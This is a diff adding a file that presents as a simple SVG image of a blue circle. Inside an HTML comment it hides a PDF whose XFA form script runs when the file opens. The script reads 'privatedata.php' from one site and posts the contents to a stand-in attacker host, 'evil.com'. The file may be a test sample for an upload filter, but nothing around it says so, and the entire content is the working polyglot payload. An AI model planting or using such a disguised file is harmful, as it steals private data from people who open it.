@@ -1,0 +1,44 @@
+<!DOCTYPE svg>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+<circle r="100" fill="blue" />
+</svg>
+<!--
+%PDF-1.
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf><interactive>1</interactive></pdf></present></config>
+<template>
+ <subform name="_">
+ <pageSet/>
+ <field id="Hello World!">
+ <event activity="initialize">
+<script contentType='application/x-formcalc'>
+var content = Get("http://example.com/privatedata.php");
+Post("http://evil.com/receiver.php",content);
+ </script>
+ </event>
+ </field>
+ </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+trailer <<
+ /Root <<
+ /AcroForm <<
+ /Fields [<<
+ /T (0)
+ /Kids [<<
+ /Subtype /Widget
+ /Rect []
+ /T ()
+ /FT /Btn
+ >>]
+ >>]
+  /XFA 1 0 R
+ >>
+ /Pages <<>>
+ >>
+>>
+-->
